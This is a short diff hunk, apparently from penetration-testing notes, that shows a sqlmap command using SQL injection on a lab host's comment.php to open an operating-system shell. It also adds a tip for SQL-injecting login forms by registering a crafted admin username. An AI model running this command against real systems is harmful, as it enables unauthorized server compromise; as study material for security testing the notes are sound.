@@ -78,4 +78,4 @@ sqlmap -u http://10.x.x.x/comment.php?id=737 --dbms=mysql --os-shell
 If it succeed, we are provided a command shell directly in our terminal.
 
 
-
+When trying to sql inject a login form, don't forget to try to register a user like admin= with a password.
